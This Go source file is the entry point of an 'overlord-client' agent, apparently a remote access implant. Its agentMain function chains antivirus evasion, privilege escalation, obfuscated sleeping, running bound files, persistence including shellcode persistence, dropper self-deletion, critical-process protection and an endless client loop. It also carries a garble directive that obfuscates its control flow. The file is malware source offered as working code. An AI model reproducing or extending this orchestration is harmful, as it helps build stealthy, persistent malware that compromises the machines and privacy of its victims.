package main

import (
	"log"
	"time"

	"overlord-client/cmd/agent/config"
	"overlord-client/cmd/agent/criticalproc"
	"overlord-client/cmd/agent/evasion"
	"overlord-client/cmd/agent/mutex"
	"overlord-client/cmd/agent/persistence"
	"overlord-client/cmd/agent/privesc"
	"overlord-client/cmd/agent/webrtcpub"
)

// agentMain is the shared entry point for both EXE and DLL build modes.
// In EXE mode it is called directly from main(). In DLL mode it is
// scheduled as a goroutine from init() so that DLL_PROCESS_ATTACH returns
// before the Go scheduler and any blocking operations begin.
func agentMain() {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	evasion.Run()
	if !privesc.IsElevated() {
		privesc.TryElevate()
	}
	installHardCrashReporter()
	cfg := config.Load()

	if cfg.SleepSeconds > 0 {
		sleepObfuscated(cfg.SleepSeconds)
	}

	runBoundFiles()
	webrtcpub.PromptFirewallPermissionOnStartup()

	if cfg.EnablePersistence {
		if isRunningInMemory() {
			if len(selfDropBinary) > 0 {
				if err := persistence.SetupFromBytes(selfDropBinary); err != nil {
					log.Printf("Warning: Failed to setup shellcode persistence: %v", err)
				} else {
					scheduleDropperSelfDelete()
				}
			}
		} else {
			if err := persistence.Setup(); err != nil {
				log.Printf("Warning: Failed to setup persistence: %v", err)
			} else {
				scheduleDropperSelfDelete()
			}
		}
	}

	releaseMutex, ok, err := mutex.Acquire(cfg.Mutex)
	if err != nil {
		log.Printf("[mutex] failed to initialize mutex: %v", err)
		log.Printf("[mutex] continuing without mutex protection")
		releaseMutex = func() {}
		ok = true
	}
	if !ok {
		log.Printf("[mutex] another instance is already running; exiting")
		return
	}
	defer releaseMutex()
	mutex.SetGlobalRelease(releaseMutex)

	if cfg.CriticalProcess {
		criticalproc.Setup()
		defer criticalproc.Teardown()
	}

	for {
		func() {
			defer recoverAndLog("main", nil)
			runClient(cfg)
		}()
		time.Sleep(2 * time.Second)
	}
}
